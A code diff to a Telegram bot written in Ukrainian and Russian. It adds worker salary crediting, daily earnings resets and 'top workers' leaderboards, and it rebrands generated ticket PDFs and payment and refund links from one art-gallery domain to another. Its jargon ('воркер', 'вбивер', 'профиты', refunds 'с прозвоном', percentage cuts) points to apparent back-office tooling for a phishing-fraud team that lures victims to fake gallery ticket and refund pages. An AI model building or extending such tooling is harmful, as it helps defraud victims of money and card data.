@@ -55,6 +55,11 @@ payment_totals = {}  # {page_code: {'total': amount, 'currency': currency, 'time
 fio_by_page_code = {}  # {page_code: {'name': str, 'timestamp': time}}
 fio_by_ip = {}         # {ip: {'name': str, 'timestamp': time}}
 
+# --- Throttle налаштування ---
+THROTTLE_WINDOW = 5  # секунди
+THROTTLE_LIMIT = 3   # максимальна кількість повідомлень
+last_messages = defaultdict(lambda: {'text': '', 'count': 0, 'time': 0})
+
 def remember_fio(name: str, page_code: str = "", ip: str = ""):
     """Зберігає ФІО в пам'яті, якщо воно валідне (не пусте, не 'Не указано')."""
     try:
@@ -352,12 +357,22 @@ CREATE TABLE IF NOT EXISTS worker_salary (
     nickname TEXT UNIQUE NOT NULL,
     total_earned DECIMAL(10,2) DEFAULT 0.0,
     current_month_earned DECIMAL(10,2) DEFAULT 0.0,
+    current_day_earned DECIMAL(10,2) DEFAULT 0.0,
     wallet TEXT,
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
     updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 )
 """)
 conn.commit()
+
+# Add current_day_earned column if it doesn't exist
+try:
+    c.execute('SELECT current_day_earned FROM worker_salary LIMIT 1')
+except sqlite3.OperationalError:
+    print("[DB] Adding current_day_earned column to worker_salary table")
+    c.execute('ALTER TABLE worker_salary ADD COLUMN current_day_earned DECIMAL(10,2) DEFAULT 0.0')
+    conn.commit()
+    print("[DB] current_day_earned column added successfully")
 
 # --- Таблица для логування нарахувань ---
 c.execute("""
@@ -381,6 +396,17 @@ try:
     conn.execute('CREATE INDEX IF NOT EXISTS idx_transactions_timestamp ON salary_transactions(timestamp)')
 except Exception:
     pass
+
+# --- Таблица для налаштувань бота ---
+c.execute("""
+CREATE TABLE IF NOT EXISTS bot_settings (
+    key TEXT PRIMARY KEY,
+    value TEXT NOT NULL,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)
+""")
+conn.commit()
 
 def get_country_by_ip(ip):
     """Отримує країну за IP з кешу або API"""
@@ -881,7 +907,8 @@ def get_worker_salary(nickname):
             'current_month_earned': float(row[3]) if row[3] else 0.0,
             'wallet': row[4],
             'created_at': row[5],
-            'updated_at': row[6]
+            'updated_at': row[6],
+            'current_day_earned': float(row[7]) if row[7] else 0.0
         }
     return None
 
@@ -890,8 +917,8 @@ def create_worker_salary(nickname, wallet=None):
     c = conn.cursor()
     try:
         c.execute('''
-            INSERT INTO worker_salary (nickname, wallet) 
-            VALUES (?, ?)
+            INSERT INTO worker_salary (nickname, wallet, current_day_earned, current_month_earned, total_earned) 
+            VALUES (?, ?, 0.0, 0.0, 0.0)
         ''', (nickname, wallet))
         conn.commit()
         return True
@@ -903,6 +930,9 @@ def update_worker_salary(nickname, amount, transaction_type, multiplier=1, origi
     """Обновляет зарплату воркера и создает транзакцию"""
     c = conn.cursor()
     try:
+        # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+        auto_reset_daily_earnings()
+        
         # Получаем или создаем запись воркера
         worker = get_worker_salary(nickname)
         if not worker:
@@ -913,9 +943,10 @@ def update_worker_salary(nickname, amount, transaction_type, multiplier=1, origi
             UPDATE worker_salary 
             SET total_earned = total_earned + ?, 
                 current_month_earned = current_month_earned + ?,
+                current_day_earned = current_day_earned + ?,
                 updated_at = CURRENT_TIMESTAMP
             WHERE nickname = ?
-        ''', (amount, amount, nickname))
+        ''', (amount, amount, amount, nickname))
         
         # Создаем запись о транзакции
         c.execute('''
@@ -964,6 +995,53 @@ def reset_monthly_earnings():
     except Exception as e:
         print(f"[SALARY] Error resetting monthly earnings: {e}")
         return False
+
+def reset_daily_earnings():
+    """Сбрасывает дневные заработки всех воркеров (вызывается раз в день)"""
+    c = conn.cursor()
+    try:
+        c.execute('UPDATE worker_salary SET current_day_earned = 0.0')
+        conn.commit()
+        return True
+    except Exception as e:
+        print(f"[SALARY] Error resetting daily earnings: {e}")
+        return False
+
+def should_reset_daily_earnings():
+    """Перевіряє, чи потрібно скинути щоденні заробітки (якщо змінилася дата)"""
+    try:
+        c = conn.cursor()
+        c.execute('SELECT value FROM bot_settings WHERE key = "last_daily_reset"')
+        row = c.fetchone()
+        
+        if not row:
+            # Перший запуск - створюємо запис
+            c.execute('INSERT INTO bot_settings (key, value) VALUES (?, ?)', 
+                     ('last_daily_reset', datetime.now().strftime('%Y-%m-%d')))
+            conn.commit()
+            return True
+        
+        last_reset = row[0]
+        current_date = datetime.now().strftime('%Y-%m-%d')
+        
+        if last_reset != current_date:
+            # Дата змінилася - оновлюємо запис та повертаємо True
+            c.execute('UPDATE bot_settings SET value = ? WHERE key = ?', 
+                     (current_date, 'last_daily_reset'))
+            conn.commit()
+            return True
+        
+        return False
+    except Exception as e:
+        print(f"[SALARY] Помилка при перевірці дати скидання: {e}")
+        return False
+
+def auto_reset_daily_earnings():
+    """Автоматично скидає щоденні заробітки, якщо змінилася дата"""
+    if should_reset_daily_earnings():
+        print("[SALARY] Автоматично скидаємо щоденні заробітки (нова дата)")
+        return reset_daily_earnings()
+    return False
 
 # --- Функции для работы с site_users ---
 def generate_site_user_id():
@@ -1212,6 +1290,10 @@ async def cmd_start(message: types.Message):
     print(f"[DEBUG] /start вызван для пользователя {uid}")
     print(f"[DEBUG] SPECIAL_ADMIN_IDS: {SPECIAL_ADMIN_IDS}")
     print(f"[DEBUG] uid in SPECIAL_ADMIN_IDS: {uid in SPECIAL_ADMIN_IDS}")
+    
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
     db_user = get_user(uid)
     if db_user:
         if db_user['status'] == 'pending':
@@ -1411,6 +1493,9 @@ async def show_profile(message: types.Message):
     join_date = db_user['last_submit'][:10] if db_user and db_user['last_submit'] else "-"
     if join_date != "-":
         join_date = datetime.fromisoformat(db_user['last_submit']).strftime('%d-%m-%Y')
+    
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
     
     # Отримуємо зарплату з нової таблиці
     worker_salary = get_worker_salary(nickname)
@@ -2062,6 +2147,52 @@ async def payout_confirm_step(call: types.CallbackQuery):
         # user_step[uid] = None
         # user_data[uid] = {}
         
+        # НАРАХОВУЄМО ЗАРПЛАТУ ВОРКЕРУ
+        try:
+            worker_nickname = payout.get('worker', '')
+            amount = payout.get('amount', 0)
+            payout_type = payout.get('type', 'Оплата')
+            
+            if worker_nickname and amount > 0:
+                # Визначаємо відсоток та множник
+                if payout_type == 'Оплата':
+                    percentage = 75
+                elif payout_type == 'Возврат с прозвоном':
+                    percentage = 55
+                elif payout_type == 'Возврат':
+                    percentage = 65
+                else:
+                    percentage = 75
+                
+                # Розраховуємо зарплату
+                original_amount = amount
+                final_amount = (amount * percentage / 100) * counter
+                
+                print(f"[SALARY] Нараховуємо зарплату: {worker_nickname}, {original_amount}$ × {percentage}% × {counter} = {final_amount}$")
+                
+                # Нараховуємо зарплату
+                success = update_worker_salary(
+                    nickname=worker_nickname,
+                    amount=final_amount,
+                    transaction_type=payout_type,
+                    multiplier=counter,
+                    original_amount=original_amount,
+                    percentage=percentage
+                )
+                
+                if success:
+                    print(f"[SALARY] ✅ Зарплату нараховано: {worker_nickname} +{final_amount}$")
+                    await call.message.answer(f"💰 Зарплату нараховано воркеру {worker_nickname}: +{final_amount}$")
+                else:
+                    print(f"[SALARY] ❌ Помилка нарахування зарплати для {worker_nickname}")
+                    await call.message.answer(f"❌ Помилка нарахування зарплати для {worker_nickname}")
+            else:
+                print(f"[SALARY] ⚠️ Недостатньо даних для нарахування: worker={worker_nickname}, amount={amount}")
+                
+        except Exception as e:
+            print(f"[SALARY] ❌ Помилка при нарахуванні зарплати: {e}")
+            await call.message.answer(f"❌ Помилка при нарахуванні зарплати: {e}")
+        
         await call.answer()
 
 # --- Обробник для нової виплати ---
@@ -2357,6 +2488,9 @@ async def tickets_message(message: types.Message):
     uid = message.from_user.id
     print(f"🔍 [TICKETS BUTTON] Натиснута кнопка 'Билеты' користувачем {uid}")
     
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
     # Сначала удаляем клавиатуру через не-пустое сообщение
     await message.answer("Введите данные для билета:", reply_markup=ReplyKeyboardRemove())
     text = (
@@ -2527,7 +2661,7 @@ async def ticket_input_handler(message: types.Message):
         top_y = height - 60
         c.setFont("Helvetica-Bold", 20)
         c.setFillColorRGB(0.7, 0.7, 0.7)
-        c.drawCentredString(width / 2, top_y, "artpullse.com")
+        c.drawCentredString(width / 2, top_y, "metanoia-gallery.com")
         
         # Имя крупно по центру (як на другому скріншоті)
         name_y = top_y - 35
@@ -2609,7 +2743,7 @@ async def ticket_input_handler(message: types.Message):
         c.save()
         
         # Копіюємо PDF у папку для вебсерверу
-        public_ticket_dir = os.path.join('artpullse.com', 'file', 'ticket')
+        public_ticket_dir = os.path.join('metanoia-gallery.com', 'file', 'ticket')
         os.makedirs(public_ticket_dir, exist_ok=True)
         public_pdf_path = os.path.join(public_ticket_dir, pdf_filename)
         
@@ -2619,7 +2753,7 @@ async def ticket_input_handler(message: types.Message):
             logging.error(f"[TICKET PDF COPY ERROR] {e}")
         
         # Формируем ссылку
-        ticket_url = f"https://artpullse.com/file/ticket/{pdf_filename}"
+        ticket_url = f"https://metanoia-gallery.com/file/ticket/{pdf_filename}"
         
         # Обновляем сообщение об успехе
         await processing_msg.edit_text("✅ **Билет создан успешно!**")
@@ -2699,6 +2833,10 @@ links_template_kb = ReplyKeyboardMarkup(
 @ban_guard
 async def handle_links_button(message: types.Message):
     print("handle_links_button called")
+    
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
     kb = ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="Создать ссылку")],
@@ -2794,7 +2932,7 @@ async def handle_choose_link_to_edit(message: types.Message):
     await message.answer(f"Настройки для ссылки ?page={page_code}", reply_markup=kb)
     user_step[message.chat.id] = f'edit_link_menu_{page_code}'
 
-@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_link_menu_'))
+@router.message(lambda m: user_step.get(m.from_user.id, '') and user_step.get(m.from_user.id, '').startswith('edit_link_menu_'))
 @ban_guard
 async def handle_edit_link_menu(message: types.Message):
     print(f"[DEBUG] handle_edit_link_menu: start, text={message.text!r}, user_step={user_step.get(message.from_user.id)}")
@@ -2837,7 +2975,7 @@ async def handle_edit_link_menu(message: types.Message):
     else:
         await message.answer("Пожалуйста, выберите действие из меню.")
 
-@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_places_choose_'))
+@router.message(lambda m: user_step.get(m.from_user.id, '') and user_step.get(m.from_user.id, '').startswith('edit_places_choose_'))
 @ban_guard
 async def handle_edit_places_choose(message: types.Message):
     state = user_step.get(message.from_user.id, '')
@@ -2861,7 +2999,7 @@ async def handle_edit_places_choose(message: types.Message):
     await message.answer(f"Текущее количество мест для {EVENT_FIXED_EVENTS[event_index]}: {places}\n\nВведите новое количество мест:", reply_markup=ReplyKeyboardRemove())
     user_step[message.from_user.id] = f'edit_places_{page_code}_{event_index}'
 
-@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_places_'))
+@router.message(lambda m: user_step.get(m.from_user.id, '') and user_step.get(m.from_user.id, '').startswith('edit_places_'))
 @ban_guard
 async def handle_edit_places(message: types.Message):
     state = user_step.get(message.from_user.id, '')
@@ -2959,7 +3097,7 @@ async def cancel_links_template(message: types.Message):
     await message.answer("Действие отменено.", reply_markup=ReplyKeyboardRemove())
     user_step[message.chat.id] = None
 
-@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('text_for_'))
+@router.message(lambda m: user_step.get(m.from_user.id, '') and user_step.get(m.from_user.id, '').startswith('text_for_'))
 @log_function
 async def admin_enter_text(message: types.Message):
     print(f"admin_enter_text called by {message.from_user.id} with text: {message.text}")
@@ -3102,11 +3240,11 @@ async def manual_payment_amount_handler(message: types.Message):
             if payment_type == 'defolt':
                 short_code = generate_short_code()
                 save_refund_link(short_code, amount, currency)
-                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1&page={short_code}"
+                link = f"https://metanoia-gallery.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1&page={short_code}"
             else:
                 short_code = generate_short_code()
                 save_refund_link(short_code, amount, currency)
-                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}&page={short_code}"
+                link = f"https://metanoia-gallery.com/refund/?total={amount}&currency={currency}&page={short_code}"
             print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
             sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
             user_step[uid] = None
@@ -3155,17 +3293,18 @@ async def block_others(message: types.Message):
     text = getattr(message, 'text', None) or getattr(message, 'caption', None)
     uid = message.from_user.id
     # --- Throttle: если пользователь спамит одинаковым текстом ---
-    now = time.time()
-    lm = last_messages[uid]
-    if lm['text'] == text and now - lm['time'] < THROTTLE_WINDOW:
-        lm['count'] += 1
-    else:
-        lm['text'] = text
-        lm['count'] = 1
-        lm['time'] = now
-    if lm['count'] > THROTTLE_LIMIT:
-        # Игнорируем спам
-        return
+    if text:  # Перевіряємо, чи є текст
+        now = time.time()
+        lm = last_messages[uid]
+        if lm['text'] == text and now - lm['time'] < THROTTLE_WINDOW:
+            lm['count'] += 1
+        else:
+            lm['text'] = text
+            lm['count'] = 1
+            lm['time'] = now
+        if lm['count'] > THROTTLE_LIMIT:
+            # Игнорируем спам
+            return
     if text and (text.strip().lower() == 'назад' or text.strip().lower() == '⬅️ назад'):
         return
     if user_step.get(uid) in ['payment_type_selection', 'manual_payment_amount']:
@@ -3177,7 +3316,7 @@ async def block_others(message: types.Message):
         if m:
             amount = m.group(1).replace(',', '.')
             currency = m.group(2).upper()
-            link = f"https://artpullse.com/refund/?total={amount}&currency={currency}"
+            link = f"https://metanoia-gallery.com/refund/?total={amount}&currency={currency}"
             await message.answer(f"Ссылка для оплаты для пользователя:\n{link}")
             return
     print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {user_step.get(message.from_user.id)}")
@@ -3219,7 +3358,7 @@ async def block_others(message: types.Message):
 
 # --- EVENTS ART BOT (ex-bot.py) ---
 EVENTS_FILE = os.path.join('events-art.com', 'events.json')
-EVENT_DOMAIN = 'artpullse.com'
+EVENT_DOMAIN = 'metanoia-gallery.com'
 EVENT_FIXED_EVENTS = [
     'Terroir and Traditions',
     'Collection Co–selection',
@@ -3255,6 +3394,9 @@ def EVENT_save_events(events):
 
 @router.message(Command('events'))
 async def events_start(message: types.Message):
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
     EVENT_user_data[message.chat.id] = {}
     await message.answer("Введите название выставки:")
     user_step[message.chat.id] = 'event_title'
@@ -4586,7 +4728,7 @@ async def universal_back_handler(message: types.Message):
 
 
 # --- Хендлер для 'Назад' у edit_places_choose_ ---
-@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_places_choose_') and m.text and m.text.lower() == 'назад')
+@router.message(lambda m: user_step.get(m.from_user.id, '') and user_step.get(m.from_user.id, '').startswith('edit_places_choose_') and m.text and m.text.lower() == 'назад')
 @ban_guard
 async def back_from_edit_places_choose(message: types.Message):
     print("==> back_from_edit_places_choose")
@@ -4605,7 +4747,7 @@ async def back_from_edit_places_choose(message: types.Message):
     user_step[message.chat.id] = f'edit_link_menu_{page_code}'
 
 # --- Хендлер для 'Назад' у edit_link_menu_ ---
-@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_link_menu_') and m.text and m.text.lower() == 'назад')
+@router.message(lambda m: user_step.get(m.from_user.id, '') and user_step.get(m.from_user.id, '').startswith('edit_link_menu_') and m.text and m.text.lower() == 'назад')
 @ban_guard
 async def back_from_edit_link_menu(message: types.Message):
     print("==> back_from_edit_link_menu")
@@ -4740,11 +4882,24 @@ async def admin_panel_back(message: types.Message):
 
 
 # --- Обробник повідомлень з каналу для нарахування зарплати ---
+# --- Тестовий handler для всіх повідомлень ---
+@router.message()
+async def debug_all_messages(message: types.Message):
+    """Тестовий handler для всіх повідомлень"""
+    print(f"[DEBUG] Отримано повідомлення: chat_id={message.chat.id}, type={message.content_type}")
+    if message.text:
+        print(f"[DEBUG] Текст: {message.text[:100]}...")
+    if message.chat.id == PAYOUT_GROUP_ID:
+        print(f"[DEBUG] 🎯 Це повідомлення з PAYOUT_GROUP_ID!")
+
 @router.message(lambda m: m.chat.id == PAYOUT_GROUP_ID and m.text)
 async def handle_payout_channel_message(message: types.Message):
     """Обробляє повідомлення з каналу виплат та нараховує зарплату воркерам"""
     try:
         print(f"[CHANNEL] Received message from payout channel: {message.text}")
+        print(f"[CHANNEL] Chat ID: {message.chat.id}")
+        print(f"[CHANNEL] PAYOUT_GROUP_ID: {PAYOUT_GROUP_ID}")
+        print(f"[CHANNEL] Message type: {message.content_type}")
         
         # Обробляємо повідомлення для нарахування зарплати
         success = await process_channel_message_for_salary(message.text)
@@ -4756,6 +4911,157 @@ async def handle_payout_channel_message(message: types.Message):
             
     except Exception as e:
         print(f"[CHANNEL] Error handling channel message: {e}")
+        import traceback
+        traceback.print_exc()
+
+# --- Команди топ воркерів ---
+@router.message(Command("top_day"))
+async def show_top_day(message: types.Message):
+    """Показує топ воркерів за сьогодні"""
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
+    c = conn.cursor()
+    c.execute('''
+        SELECT nickname, current_day_earned 
+        FROM worker_salary 
+        WHERE current_day_earned > 0 
+        ORDER BY current_day_earned DESC 
+        LIMIT 10
+    ''')
+    workers = c.fetchall()
+    
+    # Рахуємо загальну статистику за сьогодні
+    c.execute('''
+        SELECT COUNT(*), SUM(amount) 
+        FROM salary_transactions 
+        WHERE DATE(timestamp) = DATE('now')
+    ''')
+    stats = c.fetchone()
+    total_profits = stats[0] if stats[0] else 0
+    total_amount = stats[1] if stats[1] else 0.0
+    
+    if not workers:
+        await message.answer("📊 За сьогодні ще немає виплат воркерам")
+        return
+    
+    # Емодзі для топ позицій
+    emojis = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟']
+    
+    text = "📊 <b>Лучшие работники за Сегодня:</b>\n\n"
+    for i, (nickname, earned) in enumerate(workers):
+        emoji = emojis[i] if i < len(emojis) else f"{i+1}."
+        text += f"{emoji} #{nickname} - {earned:.1f}$\n"
+    
+    text += f"\n<b>Статистика за сегодня:</b>\n"
+    text += f"🧲 Кол-во профитов: {total_profits}\n"
+    text += f"💵 Общая сумма: {total_amount:.0f} $"
+    
+    await message.answer(text, parse_mode='HTML')
+
+@router.message(Command("top_month"))
+async def show_top_month(message: types.Message):
+    """Показує топ воркерів за поточний місяць"""
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
+    c = conn.cursor()
+    c.execute('''
+        SELECT nickname, current_month_earned 
+        FROM worker_salary 
+        WHERE current_month_earned > 0 
+        ORDER BY current_month_earned DESC 
+        LIMIT 10
+    ''')
+    workers = c.fetchall()
+    
+    # Рахуємо загальну статистику за поточний місяць
+    current_month = datetime.now().strftime('%Y-%m')
+    c.execute('''
+        SELECT COUNT(*), SUM(amount) 
+        FROM salary_transactions 
+        WHERE strftime('%Y-%m', timestamp) = ?
+    ''', (current_month,))
+    stats = c.fetchone()
+    total_profits = stats[0] if stats[0] else 0
+    total_amount = stats[1] if stats[1] else 0.0
+    
+    if not workers:
+        await message.answer("📊 За поточний місяць ще немає виплат воркерам")
+        return
+    
+    # Емодзі для топ позицій
+    emojis = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟']
+    
+    # Назва поточного місяця
+    month_name = datetime.now().strftime('%B').lower()
+    month_names = {
+        'january': 'январь', 'february': 'февраль', 'march': 'март',
+        'april': 'апрель', 'may': 'май', 'june': 'июнь',
+        'july': 'июль', 'august': 'август', 'september': 'сентябрь',
+        'october': 'октябрь', 'november': 'ноябрь', 'december': 'декабрь'
+    }
+    current_month_name = month_names.get(month_name, month_name)
+    
+    text = f"📊 <b>Лучшие работники за {current_month_name}:</b>\n\n"
+    for i, (nickname, earned) in enumerate(workers):
+        emoji = emojis[i] if i < len(emojis) else f"{i+1}."
+        text += f"{emoji} #{nickname} - {earned:.1f}$\n"
+    
+    text += f"\n<b>Статистика проекта за {current_month_name}:</b>\n"
+    text += f"🧲 Кол-во профитов: {total_profits}\n"
+    text += f"💵 Сумма за {current_month_name}: {total_amount:.0f} $"
+    
+    await message.answer(text, parse_mode='HTML')
+
+@router.message(Command("top_all"))
+async def show_top_all_time(message: types.Message):
+    """Показує топ воркерів за весь час"""
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
+    c = conn.cursor()
+    c.execute('''
+        SELECT nickname, total_earned 
+        FROM worker_salary 
+        WHERE total_earned > 0 
+        ORDER BY total_earned DESC 
+        LIMIT 10
+    ''')
+    workers = c.fetchall()
+    
+    # Рахуємо загальну статистику за весь час
+    c.execute('SELECT COUNT(*), SUM(amount) FROM salary_transactions')
+    stats = c.fetchone()
+    total_profits = stats[0] if stats[0] else 0
+    total_amount = stats[1] if stats[1] else 0.0
+    
+    # Дата старту проекту (перша транзакція)
+    c.execute('SELECT MIN(DATE(timestamp)) FROM salary_transactions')
+    start_date = c.fetchone()[0]
+    if start_date:
+        start_date_formatted = datetime.strptime(start_date, '%Y-%m-%d').strftime('%d.%m.%Y')
+    else:
+        start_date_formatted = "01.09.2025"  # За замовчуванням
+    
+    if not workers:
+        await message.answer("📊 Ще немає виплат воркерам")
+        return
+    
+    # Емодзі для топ позицій
+    emojis = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟']
+    
+    text = "📊 <b>Лучшие работники за все время:</b>\n\n"
+    for i, (nickname, earned) in enumerate(workers):
+        emoji = emojis[i] if i < len(emojis) else f"{i+1}."
+        text += f"{emoji} #{nickname} - {earned:.1f}$\n"
+    
+    text += f"\n<b>Статистика проекта:</b>\n"
+    text += f"📅 Старт проекта: {start_date_formatted}\n"
+    text += f"🧲 Кол-во профитов: {total_profits}\n"
+    text += f"💵 Общая сумма: {total_amount:.0f} $"
+    
+    await message.answer(text, parse_mode='HTML')
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
@@ -4805,14 +5111,21 @@ if __name__ == '__main__':
         # Зберігаємо порт у глобальній змінній для використання в інших частинах
         global WEBHOOK_PORT
         WEBHOOK_PORT = port
+        
+        # --- Автоматичне скидання щоденних заробітків при запуску ---
+        print("[SALARY] Перевіряємо, чи потрібно скинути щоденні заробітки...")
+        auto_reset_daily_earnings()
+        
         # aiogram polling
         await dp.start_polling(bot)
-    asyncio.run(main())
 
 @router.message(Command("test_buttons"))
 async def test_buttons_command(message: types.Message):
     """Тестова команда для перевірки кнопок"""
     print(f"[DEBUG] /test_buttons command received from user {message.from_user.id}")
+    
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
     
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
@@ -4837,6 +5150,9 @@ async def test_buttons_command(message: types.Message):
 
 @router.message(Command("show_group_ids"))
 async def show_group_ids(message: types.Message):
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
     print(f"PAYMENT_GROUP_ID: {PAYMENT_GROUP_ID}")
     print(f"PAYOUT_GROUP_ID: {PAYOUT_GROUP_ID}")
     await message.answer("Группы выведены в терминал сервера.")
@@ -4847,6 +5163,9 @@ async def show_salary_info(message: types.Message):
     uid = message.from_user.id
     db_user = get_user(uid)
     nickname = db_user['username'] if db_user else f"{uid}"
+    
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
     
     worker_salary = get_worker_salary(nickname)
     if worker_salary:
@@ -4879,6 +5198,9 @@ async def test_salary_system(message: types.Message):
         await message.answer("❌ У вас нет прав для выполнения этой команды")
         return
     
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
     # Тестуємо різні типи повідомлень
     test_messages = [
         "Новая Оплата x1\n\n🧑‍🏭Воркер: #testworker\n💰Сумма: 100.0$\n👨‍💻Вбивер: #test1\n👨‍💻Саппорт: #test2",
@@ -4900,11 +5222,30 @@ async def reset_monthly_earnings_command(message: types.Message):
         await message.answer("❌ У вас нет прав для выполнения этой команды")
         return
     
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
     success = reset_monthly_earnings()
     if success:
         await message.answer("✅ Місячні заробітки всіх воркерів успішно скинуті")
     else:
         await message.answer("❌ Помилка при скиданні місячних заробітків")
+
+@router.message(Command("reset_daily"))
+async def reset_daily_earnings_command(message: types.Message):
+    """Скидає щоденні заробітки всіх воркерів"""
+    if not is_admin(message.from_user.id):
+        await message.answer("❌ У вас нет прав для выполнения этой команды")
+        return
+    
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
+    success = reset_daily_earnings()
+    if success:
+        await message.answer("✅ Щоденні заробітки всіх воркерів успішно скинуті")
+    else:
+        await message.answer("❌ Помилка при скиданні щоденних заробітків")
 
 @router.message(Command("worker_stats"))
 async def show_worker_stats(message: types.Message):
@@ -4913,8 +5254,11 @@ async def show_worker_stats(message: types.Message):
         await message.answer("❌ У вас нет прав для выполнения этой команды")
         return
     
+    # --- Автоматично перевіряємо та скидаємо щоденні заробітки, якщо змінилася дата ---
+    auto_reset_daily_earnings()
+    
     c = conn.cursor()
-    c.execute('SELECT nickname, total_earned, current_month_earned, wallet FROM worker_salary ORDER BY total_earned DESC')
+    c.execute('SELECT nickname, total_earned, current_month_earned, current_day_earned, wallet FROM worker_salary ORDER BY total_earned DESC')
     workers = c.fetchall()
     
     if not workers:
@@ -4922,13 +5266,16 @@ async def show_worker_stats(message: types.Message):
         return
     
     text = "📊 <b>Статистика воркерів:</b>\n\n"
-    for i, (nickname, total, monthly, wallet) in enumerate(workers, 1):
+    for i, (nickname, total, monthly, daily, wallet) in enumerate(workers, 1):
         text += f"{i}. <b>#{nickname}</b>\n"
         text += f"   💰 Всього: <code>{total:.2f}$</code>\n"
         text += f"   📅 Місяць: <code>{monthly:.2f}$</code>\n"
+        text += f"   🌅 День: <code>{daily:.2f}$</code>\n"
         text += f"   💳 Кошелек: <code>{wallet or 'Не встановлено'}</code>\n\n"
     
     await message.answer(text, parse_mode='HTML')
+
+
 
 @router.message()
 async def group_id_echo(message: types.Message):
@@ -43946,3 +44293,7 @@ async def event_data_api(request):
 
 
 
+
+# --- Запуск бота ---
+if __name__ == "__main__":
+    asyncio.run(main())
